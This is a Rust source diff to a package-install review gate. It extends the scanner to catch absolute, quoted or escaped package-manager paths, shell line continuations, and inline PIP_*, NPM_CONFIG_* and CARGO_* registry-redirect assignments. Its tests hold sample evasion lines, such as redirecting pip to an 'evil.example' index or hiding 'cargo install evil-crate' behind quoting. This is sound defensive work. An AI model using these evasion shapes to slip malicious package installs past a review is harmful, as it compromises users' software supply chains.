@@ -14,6 +14,7 @@
 
 use std::path::Path;
 
+use crate::registry::Ecosystem;
 use crate::version::VersionInfo;
 
 use crate::diff::Delta;
@@ -71,6 +72,20 @@ impl RefManager {
             RefManager::Cargo => "cargo",
             RefManager::Yay => "yay",
             RefManager::Paru => "paru",
+        }
+    }
+
+    /// Which registry an install through this manager resolves against:
+    /// AUR helpers deliver through the AUR, cargo installs through
+    /// crates.io, pip through PyPI, everything else through npm. Single
+    /// source of truth for the gate and the recursive reviewer, so a new
+    /// manager cannot silently land in the wrong ecosystem in one lane.
+    pub fn ecosystem(self) -> Ecosystem {
+        match self {
+            RefManager::Pip => Ecosystem::PyPi,
+            RefManager::Cargo => Ecosystem::Cargo,
+            RefManager::Yay | RefManager::Paru => Ecosystem::Aur,
+            _ => Ecosystem::Npm,
         }
     }
 }
@@ -319,18 +334,8 @@ pub fn scan_line(line: &str) -> Vec<(RefManager, String)> {
 fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
     let mut refs = Vec::new();
     for i in 0..toks.len() {
-        let manager = match toks[i].lower.as_str() {
-            "npm" => RefManager::Npm,
-            "npx" => RefManager::Npx,
-            "pnpm" => RefManager::Pnpm,
-            "yarn" => RefManager::Yarn,
-            "bun" => RefManager::Bun,
-            "bunx" => RefManager::Bunx,
-            "pip" | "pip3" => RefManager::Pip,
-            "cargo" => RefManager::Cargo,
-            "yay" => RefManager::Yay,
-            "paru" => RefManager::Paru,
-            _ => continue,
+        let Some(manager) = manager_from_token(&toks[i].lower) else {
+            continue;
         };
         if toks[i].ends_command || toks[i].is_separator {
             continue;
@@ -450,6 +455,66 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
         }
     }
     refs
+}
+
+/// Resolve a (lowercased) command word to its package manager, matching
+/// the basename so absolute paths (`/usr/bin/npm`), quoted paths
+/// (`"/usr/bin/npm"`), and backslash-escaped tokens (`\npm`, Windows
+/// `C:\tools\npm`) cannot dodge the scanner. A bare `npm install` and an
+/// absolute-path `npm install` run the same binary; the review must see
+/// both. Returns `None` for anything that is not a manager invocation.
+fn manager_from_token(word: &str) -> Option<RefManager> {
+    let bare = word
+        .trim_start_matches(['\\', '"', '\'', '`', '$', '(', '{'])
+        .trim_end_matches(['"', '\'', '`', ')', '}', ';', ',']);
+    let base = bare.rsplit(['/', '\\']).next().unwrap_or(bare);
+    match base {
+        "npm" => Some(RefManager::Npm),
+        "npx" => Some(RefManager::Npx),
+        "pnpm" => Some(RefManager::Pnpm),
+        "yarn" => Some(RefManager::Yarn),
+        "bun" => Some(RefManager::Bun),
+        "bunx" => Some(RefManager::Bunx),
+        "pip" | "pip3" => Some(RefManager::Pip),
+        "cargo" => Some(RefManager::Cargo),
+        "yay" => Some(RefManager::Yay),
+        "paru" => Some(RefManager::Paru),
+        _ => None,
+    }
+}
+
+/// True when the word is an inline environment assignment that can redirect
+/// a package manager away from its default registry: `NPM_CONFIG_*`,
+/// `PIP_*`, or `CARGO_*` (matched case-insensitively; the scanner already
+/// lowercases). `PIP_INDEX_URL=https://evil pip install requests` would be
+/// reviewed against PyPI while installing from the attacker's index.
+fn is_redirect_env_assignment(word: &str) -> bool {
+    let Some((name, _)) = word.split_once('=') else {
+        return false;
+    };
+    let name = name.trim_start_matches(['\\', '"', '\'', '`']);
+    name.starts_with("npm_config_") || name.starts_with("pip_") || name.starts_with("cargo_")
+}
+
+/// True when a process-environment variable NAME can redirect installs at
+/// runtime (same families as the inline assignments). Names only — values
+/// are never inspected or stored.
+pub fn is_redirect_env_name(name: &str) -> bool {
+    let lower = name.to_lowercase();
+    lower.starts_with("npm_config_") || lower.starts_with("pip_") || lower.starts_with("cargo_")
+}
+
+/// The redirect-capable variables present in the given environment names.
+/// The gate feeds this `std::env` at gate time so an exported redirect is
+/// disclosed even though it never appears in the gated command line.
+pub fn redirect_env_present<'a>(names: impl Iterator<Item = &'a str>) -> Vec<String> {
+    let mut hits: Vec<String> = names
+        .filter(|n| is_redirect_env_name(n))
+        .map(|n| n.to_string())
+        .collect();
+    hits.sort();
+    hits.dedup();
+    hits
 }
 
 /// Positional package specs after a manager verb. `take_all` collects
@@ -572,13 +637,16 @@ fn non_registry_spec(token: &str) -> bool {
 /// scripts that run during a plain `npm install` are scanned — a reference
 /// in `test` or `lint` never executes on the install line. An oversized
 /// line is disclosed as an unparseable reference, never skipped silently.
+/// Shell continuations (`\` + newline) are joined first so a split
+/// invocation (`npm \` + newline + `install evil`) scans as the one logical
+/// command the shell would run.
 pub fn from_npm_lifecycle(manifest: &PackageJson) -> Vec<InstallRef> {
     let mut refs = Vec::new();
     for script_name in manifest.lifecycle_scripts() {
         let Some(body) = manifest.scripts.get(&script_name) else {
             continue;
         };
-        for line in body.lines() {
+        for line in join_continuations(body).lines() {
             let origin = RefOrigin::NpmLifecycle {
                 script: script_name.clone(),
             };
@@ -592,7 +660,8 @@ pub fn from_npm_lifecycle(manifest: &PackageJson) -> Vec<InstallRef> {
 /// onto PATH and run with the user's privileges. Scan is delta-driven and
 /// bounded: only files listed in the delta under a `.data/scripts/`
 /// directory. A script that cannot be read as UTF-8 is disclosed as an
-/// unparseable reference rather than silently skipped.
+/// unparseable reference rather than silently skipped. Shell continuations
+/// are joined before scanning, mirroring the npm lifecycle lane.
 pub fn from_wheel_data_scripts(root: &Path, delta: &Delta) -> Vec<InstallRef> {
     let mut refs = Vec::new();
     let changed = delta
@@ -610,11 +679,18 @@ pub fn from_wheel_data_scripts(root: &Path, delta: &Delta) -> Vec<InstallRef> {
                 continue;
             }
         };
-        for line in text.lines() {
+        for line in join_continuations(&text).lines() {
             refs.extend(scan_text_line(line, &origin));
         }
     }
     refs
+}
+
+/// Join shell line continuations so a manager invocation split across
+/// physical lines scans as the single logical command the shell runs.
+/// CRLF is folded first so a Windows-style continuation joins too.
+fn join_continuations(text: &str) -> String {
+    text.replace("\\\r\n", "").replace("\\\n", "")
 }
 
 fn scan_text_line(line: &str, origin: &RefOrigin) -> Vec<InstallRef> {
@@ -631,30 +707,98 @@ fn scan_text_line(line: &str, origin: &RefOrigin) -> Vec<InstallRef> {
 }
 
 /// Shapes the token scanner cannot safely resolve, surfaced for the hook
-/// gate to deny: pip flags that name or redirect non-registry sources, and
-/// manager tokens hidden inside quotes or shell escapes. Best-effort
-/// obfuscation (obase64'd scripts, indirect exec) is NOT caught here — the
-/// gate's doc says so.
+/// gate to deny: pip flags that name or redirect non-registry sources,
+/// inline environment assignments (`NPM_CONFIG_*`, `PIP_*`, `CARGO_*`) and
+/// `.npmrc` references that would install from elsewhere than the reviewed
+/// registry, and manager tokens hidden inside quotes or shell escapes.
+/// Best-effort obfuscation (obase64'd scripts, indirect exec) is NOT caught
+/// here — the gate's doc says so.
 pub fn gate_hard_denies(line: &str) -> Vec<String> {
     let mut denies = npm_registry_override_shape(line);
     if let Some(detail) = pip_non_registry_shape(line) {
         denies.push(detail);
     }
+    denies.extend(env_redirect_shape(line));
     let lower_words: Vec<String> = line
         .to_lowercase()
         .split_whitespace()
         .map(|w| w.to_string())
         .collect();
-    const MANAGERS: [&str; 7] = ["npm", "npx", "pnpm", "yarn", "bun", "pip", "pip3"];
+    const MANAGERS: [&str; 11] = [
+        "npm", "npx", "pnpm", "yarn", "bun", "bunx", "pip", "pip3", "cargo", "yay", "paru",
+    ];
     for word in &lower_words {
         let bare = word
             .trim_start_matches(['\\', '"', '\'', '`', '$', '(', '{'])
             .trim_end_matches(['"', '\'', '`', ')', '}', ';', ',']);
-        if bare != word && MANAGERS.contains(&bare) {
+        // Basename match, mirroring `manager_from_token`: a quoted or
+        // escaped absolute path (`"/usr/bin/npm"`, `\npm`) hides the same
+        // token a bare `npm` names. A plain absolute path (`/usr/bin/npm`)
+        // is not hidden — it scans through `manager_from_token` — so only
+        // words carrying quoting/escape/substitution syntax deny here.
+        let base = bare.rsplit(['/', '\\']).next().unwrap_or(bare);
+        if bare != word.as_str() && MANAGERS.contains(&base) {
             denies.push(format!(
                 "package manager token hidden behind quoting, an escape, or substitution: `{word}`"
             ));
         }
+    }
+    denies
+}
+
+/// Inline environment assignments that redirect the install away from the
+/// reviewed registry (`PIP_INDEX_URL=https://evil pip install requests`,
+/// `NPM_CONFIG_REGISTRY=... npm install y`, `CARGO_REGISTRIES_... cargo
+/// install foo`) plus `.npmrc` references, which silently re-point npm at
+/// another registry. Denied outright: the review would vouch for bytes the
+/// install never fetches.
+fn env_redirect_shape(line: &str) -> Vec<String> {
+    let lower = line.to_lowercase();
+    let words: Vec<&str> = lower.split_whitespace().collect();
+    let has_manager = words.iter().any(|w| manager_from_token(w).is_some());
+    if !has_manager {
+        return Vec::new();
+    }
+    let mut denies = Vec::new();
+    for word in &words {
+        if !is_redirect_env_assignment(word) {
+            continue;
+        }
+        let name = word
+            .split_once('=')
+            .map(|(name, _)| name.trim_start_matches(['\\', '"', '\'', '`']))
+            .unwrap_or("");
+        if name.starts_with("npm_config_") {
+            denies.push(
+                "npm_config_* environment assignment can override registry and auth config"
+                    .to_string(),
+            );
+            break;
+        }
+        if name.starts_with("pip_") {
+            denies.push(
+                "PIP_* environment assignment (PIP_INDEX_URL, PIP_EXTRA_INDEX_URL, \
+                 PIP_CONFIG_FILE, ...) can redirect the package index away from the \
+                 reviewed registry"
+                    .to_string(),
+            );
+            break;
+        }
+        if name.starts_with("cargo_") {
+            denies.push(
+                "CARGO_* environment assignment can redirect registry sources away from \
+                 the reviewed index"
+                    .to_string(),
+            );
+            break;
+        }
+    }
+    if words.iter().any(|w| w.contains(".npmrc")) {
+        denies.push(
+            "command references an .npmrc file, which can redirect the registry for \
+             the installs that follow"
+                .to_string(),
+        );
     }
     denies
 }
@@ -674,9 +818,19 @@ fn npm_registry_override_shape(line: &str) -> Vec<String> {
     ];
     let lower = line.to_lowercase();
     let words: Vec<&str> = lower.split_whitespace().collect();
-    let has_manager = words
-        .iter()
-        .any(|w| matches!(*w, "npm" | "npx" | "pnpm" | "yarn" | "bun" | "bunx"));
+    let has_manager = words.iter().any(|w| {
+        manager_from_token(w).is_some_and(|m| {
+            matches!(
+                m,
+                RefManager::Npm
+                    | RefManager::Npx
+                    | RefManager::Pnpm
+                    | RefManager::Yarn
+                    | RefManager::Bun
+                    | RefManager::Bunx
+            )
+        })
+    });
     if !has_manager {
         return Vec::new();
     }
@@ -691,15 +845,6 @@ fn npm_registry_override_shape(line: &str) -> Vec<String> {
         );
     }
     for word in &words {
-        // npm_config_* environment assignments override registry and auth
-        // config for the install that follows.
-        if word.starts_with("npm_config_") {
-            denies.push(
-                "npm_config_* environment assignment can override registry and auth config"
-                    .to_string(),
-            );
-            break;
-        }
         if !has_npm_install {
             continue;
         }
@@ -729,7 +874,7 @@ fn pip_non_registry_shape(line: &str) -> Option<String> {
     let lower = line.to_lowercase();
     let words: Vec<&str> = lower.split_whitespace().collect();
     for i in 0..words.len() {
-        if words[i] != "pip" && words[i] != "pip3" {
+        if manager_from_token(words[i]) != Some(RefManager::Pip) {
             continue;
         }
         // Anywhere after `pip install`, any dangerous flag is a hard deny —
@@ -1078,6 +1223,68 @@ mod tests {
     }
 
     #[test]
+    fn gate_hard_denies_quoted_cargo_yay_paru_bunx() {
+        for line in [
+            "\"cargo\" install evil-crate",
+            "'cargo' install evil-crate",
+            "\\cargo install evil-crate",
+            "\"yay\" -S evil-pkg",
+            "'paru' -S evil-pkg",
+            "\"bunx\" evil-pkg",
+            "$(cargo install evil-crate)",
+        ] {
+            let denies = gate_hard_denies(line);
+            assert!(
+                !denies.is_empty(),
+                "{line}: quoted manager must deny, never silent allow"
+            );
+        }
+        assert!(gate_hard_denies("cargo install evil-crate").is_empty());
+    }
+
+    #[test]
+    fn continuation_joining_yields_ref_or_disclosure() {
+        for (script, manager, spec) in [
+            ("postinstall", RefManager::Npm, "evil-pkg"),
+            ("preinstall", RefManager::Npm, "evil-pkg"),
+        ] {
+            let refs = npm_refs(script, "npm \\\n install evil-pkg");
+            assert!(
+                refs.iter().any(|r| r.manager == manager && r.spec == spec)
+                    || refs.iter().any(|r| !r.parseable),
+                "split invocation must yield a ref or a disclosure: {refs:?}"
+            );
+        }
+        let refs = npm_refs("postinstall", "pip \\\n install requests==2.31.0");
+        assert!(
+            refs.iter().any(|r| r.spec == "requests==2.31.0") || refs.iter().any(|r| !r.parseable),
+            "split pip invocation must yield a ref or a disclosure: {refs:?}"
+        );
+    }
+
+    #[test]
+    fn wheel_continuation_joining_yields_ref_or_disclosure() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = "pkg-1.0.data/scripts/setup-deps";
+        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
+        std::fs::write(dir.path().join(path), "pip \\\n install requests==2.31.0\n").unwrap();
+        let delta = crate::diff::Delta {
+            baseline_version: None,
+            target_version: "1.0.0".into(),
+            files_added: vec![crate::diff::FileChange {
+                relative_path: path.to_string(),
+                ..Default::default()
+            }],
+            ..Default::default()
+        };
+        let refs = from_wheel_data_scripts(dir.path(), &delta);
+        assert!(
+            refs.iter().any(|r| r.spec == "requests==2.31.0") || refs.iter().any(|r| !r.parseable),
+            "split wheel invocation must yield a ref or a disclosure: {refs:?}"
+        );
+    }
+
+    #[test]
     fn scanner_captures_npx_package_flag_and_exec_verbs() {
         let refs = scan_line("npx --package=evil-pkg serve");
         assert_eq!(refs.len(), 1);
@@ -1206,5 +1413,135 @@ mod tests {
         assert_eq!(refs[0].spec, "malcontent");
         assert_eq!(refs[1].manager, RefManager::Pip);
         assert_eq!(refs[1].spec, "evil-pkg");
+    }
+
+    #[test]
+    fn scanner_matches_absolute_and_quoted_manager_paths() {
+        for (line, manager, spec) in [
+            ("/usr/bin/npm install evil-pkg", RefManager::Npm, "evil-pkg"),
+            ("/usr/local/bin/npx evil-pkg", RefManager::Npx, "evil-pkg"),
+            ("/usr/bin/pip install requests", RefManager::Pip, "requests"),
+            (
+                "/usr/local/bin/pip3 install requests",
+                RefManager::Pip,
+                "requests",
+            ),
+            (
+                "\"/usr/bin/npm\" install evil-pkg",
+                RefManager::Npm,
+                "evil-pkg",
+            ),
+            (
+                "'/usr/bin/pip' install requests",
+                RefManager::Pip,
+                "requests",
+            ),
+            ("\\npm install evil-pkg", RefManager::Npm, "evil-pkg"),
+            (
+                "C:\\tools\\npm install evil-pkg",
+                RefManager::Npm,
+                "evil-pkg",
+            ),
+        ] {
+            let refs = scan_line(line);
+            assert!(
+                refs.iter().any(|(m, s)| *m == manager && s == spec),
+                "{line} must surface {manager:?} {spec}: {refs:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn gate_shapes_fire_behind_absolute_manager_paths() {
+        assert!(gate_hard_denies("/usr/bin/npm install evil-pkg").is_empty());
+        assert!(
+            gate_hard_denies("/usr/bin/npm install x --registry https://evil.example").len() == 1
+        );
+        assert!(gate_hard_denies("/usr/bin/pip install -r requirements.txt").len() == 1);
+        assert!(gate_hard_denies("/usr/local/bin/npx --package=evil-pkg serve").is_empty());
+        let refs = scan_line("/usr/local/bin/npx --package=evil-pkg serve");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "evil-pkg");
+    }
+
+    #[test]
+    fn gate_denies_quoted_absolute_manager_tokens() {
+        for line in [
+            "\"/usr/bin/npm\" install evil-pkg",
+            "'/usr/bin/pip' install requests",
+            "\"/usr/local/bin/npx\" evil-pkg",
+        ] {
+            let denies = gate_hard_denies(line);
+            assert!(
+                denies.iter().any(|d| d.contains("hidden behind quoting")),
+                "{line} must deny as hidden: {denies:?}"
+            );
+        }
+        assert!(
+            gate_hard_denies("/usr/bin/npm install evil-pkg")
+                .iter()
+                .all(|d| !d.contains("hidden behind quoting"))
+        );
+    }
+
+    #[test]
+    fn gate_denies_inline_registry_redirect_assignments() {
+        for line in [
+            "PIP_INDEX_URL=https://evil.example pip install requests",
+            "PIP_EXTRA_INDEX_URL=https://evil.example pip install requests",
+            "PIP_CONFIG_FILE=/tmp/pip.conf pip install requests",
+            "NPM_CONFIG_REGISTRY=https://evil.example npm install y",
+            "npm_config_registry=https://evil.example npm install y",
+            "CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse cargo install foo",
+            "cargo_net_offline=true cargo install foo",
+        ] {
+            let denies = gate_hard_denies(line);
+            assert_eq!(denies.len(), 1, "{line}: {denies:?}");
+        }
+        assert!(gate_hard_denies("pip install requests==2.31.0").is_empty());
+        assert!(gate_hard_denies("npm install y").is_empty());
+        assert!(gate_hard_denies("cargo install foo").is_empty());
+        assert!(gate_hard_denies("PIP_INDEX_URL=https://evil.example echo hi").is_empty());
+    }
+
+    #[test]
+    fn gate_denies_npmrc_references() {
+        assert!(!gate_hard_denies("npm install x --userconfig .npmrc").is_empty());
+        assert!(!gate_hard_denies("npm --userconfig=.npmrc install x").is_empty());
+    }
+
+    #[test]
+    fn redirect_env_names_cover_registry_redirect_families() {
+        assert!(is_redirect_env_name("PIP_INDEX_URL"));
+        assert!(is_redirect_env_name("PIP_EXTRA_INDEX_URL"));
+        assert!(is_redirect_env_name("PIP_CONFIG_FILE"));
+        assert!(is_redirect_env_name("pip_quiet"));
+        assert!(is_redirect_env_name("NPM_CONFIG_REGISTRY"));
+        assert!(is_redirect_env_name("npm_config_auth_token"));
+        assert!(is_redirect_env_name("CARGO_REGISTRIES_CRATES_IO_PROTOCOL"));
+        assert!(is_redirect_env_name("CARGO_NET_OFFLINE"));
+        assert!(!is_redirect_env_name("PATH"));
+        assert!(!is_redirect_env_name("BLUELINE_POLICY"));
+        let hits: Vec<String> = redirect_env_present(
+            ["PATH", "PIP_INDEX_URL", "HOME", "NPM_CONFIG_REGISTRY"]
+                .iter()
+                .copied(),
+        );
+        assert_eq!(hits, vec!["NPM_CONFIG_REGISTRY", "PIP_INDEX_URL"]);
+    }
+
+    #[test]
+    fn every_manager_maps_to_its_registry() {
+        use crate::registry::Ecosystem;
+        assert_eq!(RefManager::Npm.ecosystem(), Ecosystem::Npm);
+        assert_eq!(RefManager::Npx.ecosystem(), Ecosystem::Npm);
+        assert_eq!(RefManager::Pnpm.ecosystem(), Ecosystem::Npm);
+        assert_eq!(RefManager::Yarn.ecosystem(), Ecosystem::Npm);
+        assert_eq!(RefManager::Bun.ecosystem(), Ecosystem::Npm);
+        assert_eq!(RefManager::Bunx.ecosystem(), Ecosystem::Npm);
+        assert_eq!(RefManager::Pip.ecosystem(), Ecosystem::PyPi);
+        assert_eq!(RefManager::Cargo.ecosystem(), Ecosystem::Cargo);
+        assert_eq!(RefManager::Yay.ecosystem(), Ecosystem::Aur);
+        assert_eq!(RefManager::Paru.ecosystem(), Ecosystem::Aur);
     }
 }
